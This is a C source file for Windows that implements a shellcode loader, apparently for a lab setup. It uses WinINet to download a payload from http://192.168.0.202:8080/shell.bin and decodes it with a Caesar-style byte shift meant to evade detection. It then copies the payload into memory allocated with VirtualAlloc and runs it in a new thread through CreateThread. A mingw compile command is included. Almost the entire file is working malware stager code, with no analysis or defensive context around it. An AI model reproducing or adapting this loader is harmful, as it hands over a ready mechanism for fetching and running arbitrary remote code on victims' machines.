#include <windows.h>
#include <wininet.h>
#include <stdio.h>

// x86_64-w64-mingw32-gcc store.c -o /mnt/c/users/admin/downloads/out.exe -lwininet

void ShellCodeCaesarCipher(char* buffer, size_t length, int shift) {
    // Caesar reverse cipher implementation with a given shift for all characters even if they are not printable
    // Ensure the shift is within the range of 0-255 and the values are wrapped between 0-255
    shift = shift % 256;
    for (size_t i = 0; i < length; i++) {
        // Apply the Caesar cipher shift
        buffer[i] = (char)((unsigned char)buffer[i] - shift);
    }
    // write shellcode to file for debugging purposes
    FILE* file = fopen("shellcode.bin", "wb");
    if (file != NULL) {
        fwrite(buffer, sizeof(char), length, file);
        fclose(file);
    } else {
        printf("Failed to open file for writing shellcode.\n");
    }
}

int main(){
    // Self Injection fetch shellcode from http://192.168.0.202:8080/shell.bin
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;
    char buffer[409600];
    hInternet = InternetOpen("SelfInjection", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("InternetOpen failed with error: %lu\n", GetLastError());
        return 1;
    }
    hConnect = InternetOpenUrl(hInternet, "http://192.168.0.202:8080/shell.bin", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        printf("InternetOpenUrl failed with error: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }
    // Read the shellcode from the URL
    if (!InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead)) {
        printf("InternetReadFile failed with error: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }
    // Close the handles
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    // Put shellcode through  Caesar cipher
    int shift = 15; // Example shift value for Caesar cipher
    ShellCodeCaesarCipher(buffer, bytesRead, shift);
    // Ensure the buffer is null-terminated for safety
    buffer[bytesRead] = '\0';
    

    // Execute the shellcode with VirtualAlloc and CreateThread
    void* exec = VirtualAlloc(NULL, bytesRead, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        printf("VirtualAlloc failed with error: %lu\n", GetLastError());
        return 1;
    }
    // Copy the shellcode to the allocated memory win32 API
    memcpy(exec, buffer, bytesRead);
    // Ensure the shellcode is executable
    DWORD oldProtect;
    if (!VirtualProtect(exec, bytesRead, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("VirtualProtect failed with error: %lu\n", GetLastError());
        VirtualFree(exec, 0, MEM_RELEASE);
        return 1;
    }
    // Create a thread to execute the shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("CreateThread failed with error: %lu\n", GetLastError());
        VirtualFree(exec, 0, MEM_RELEASE);
        return 1;
    }
    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);
    // Clean up
    CloseHandle(hThread);
    VirtualFree(exec, 0, MEM_RELEASE);
    printf("Shellcode executed successfully.\n");
    return 0;
}